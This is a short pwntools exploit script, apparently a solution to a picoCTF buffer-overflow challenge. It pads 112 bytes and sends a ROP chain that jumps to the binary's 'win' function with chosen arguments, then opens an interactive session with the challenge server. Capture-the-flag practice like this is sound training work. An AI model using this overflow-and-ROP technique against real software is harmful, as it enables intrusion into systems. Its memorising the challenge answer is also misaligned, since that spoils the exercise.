from pwn import *
exe = context.binary = ELF("./vuln")
r = process()
r = remote("saturn.picoctf.net",57237)
offset = 112
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(exe.sym['win'])
rop.raw(0x0)
rop.raw(0xcafef00d)
rop.raw(0xf00df00d)
r.sendline(rop.chain())
r.interactive()